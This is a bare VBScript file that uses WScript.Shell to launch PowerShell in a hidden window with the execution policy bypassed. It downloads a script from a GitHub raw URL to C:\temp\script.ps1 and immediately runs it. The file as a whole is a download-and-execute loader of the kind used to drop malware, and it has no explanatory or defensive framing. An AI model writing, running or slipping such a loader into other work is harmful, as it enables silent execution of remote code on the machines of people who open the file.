Set objShell = CreateObject("WScript.Shell")
scriptURL = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/gm.ps1"
objShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""(New-Object Net.WebClient).DownloadFile('" & scriptURL & "', 'C:\temp\script.ps1'); & 'C:\temp\script.ps1'""", 0, True
Set objShell = Nothing
